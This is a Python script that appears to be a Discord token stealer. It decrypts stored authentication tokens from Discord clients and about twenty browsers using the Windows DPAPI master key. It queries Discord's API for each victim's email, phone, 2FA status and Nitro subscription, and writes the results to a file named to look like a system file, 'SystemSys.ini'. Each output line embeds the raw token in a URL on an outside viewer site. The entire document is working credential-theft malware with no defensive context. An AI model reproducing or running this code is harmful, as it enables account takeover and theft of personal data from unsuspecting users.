from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir, getenv, remove
from json import loads
from re import findall
import requests
import os
from datetime import datetime
import sys

tokens = []
cleaned = []
seen_tokens = set()

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_token():
    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    appdata_path = getenv('APPDATA')
    output_file = os.path.join(appdata_path, 'SystemSys.ini')

    if os.path.exists(output_file):
        remove(output_file)

    full_output = ""

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except:
            continue

        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith((".ldb", ".log")): continue
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for line in files.readlines():
                        for value in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line.strip()):
                            tokens.append(value)
            except PermissionError:
                continue

        cleaned.extend([i for i in tokens if i not in cleaned])

        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            
            if tok in seen_tokens:
                continue
            
            seen_tokens.add(tok)
            
            headers = {'Authorization': tok, 'Content-Type': 'application/json'}
            try:
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            except:
                continue

            if res.status_code == 200:
                res_json = res.json()
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json['id']
                email = res_json['email']
                phone = res_json['phone']
                mfa_enabled = res_json['mfa_enabled']
                has_nitro = False
                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                days_left = 0
                if has_nitro:
                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    days_left = abs((d2 - d1).days)

                output = f"> **{user_name}** ID: `{user_id}` \n\n" \
                         f"**▾ Account Information **\n> • Email: {email}\n> • Phone: {phone}\n> • n2FA/MFA Enabled: {mfa_enabled}\n" \
                         f"> • Nitro: {has_nitro}\n> • Expires in: {days_left if days_left else 'None'} day(s)\n" \
                         f"> • Token: [Click](https://eddit.me/tokenviewer/index.php?text={tok})"

                output = output.replace("\n\n", r" \n\n ").replace("\n", r" \n ").replace(r"\n", r"  \n ")

                if not full_output:
                    full_output += output + r" \n\n "
                else:
                    full_output += output + r" "

    if not full_output:
        error_message = "Error: No tokens found or an issue occurred during execution."
        error_output = error_message.replace("\n\n", r" \n\n ").replace("\n", r" \n ").replace(r"\n", r"  \n ")
        with open(output_file, "a", encoding="utf-8") as f:
            f.write(error_output.strip())
        sys.exit()

    with open(output_file, "a", encoding="utf-8") as f:
        f.write(full_output.strip())

if __name__ == '__main__':
    try:
        get_token()
    except Exception as e:
        error_message = f"Error: {str(e)}"
        error_output = error_message.replace("\n\n", r" \n\n ").replace("\n", r" \n ").replace(r"\n", r"  \n ")
        with open(os.path.join(getenv('APPDATA'), 'SystemSys.ini'), "a", encoding="utf-8") as f:
            f.write(error_output.strip())
        sys.exit()
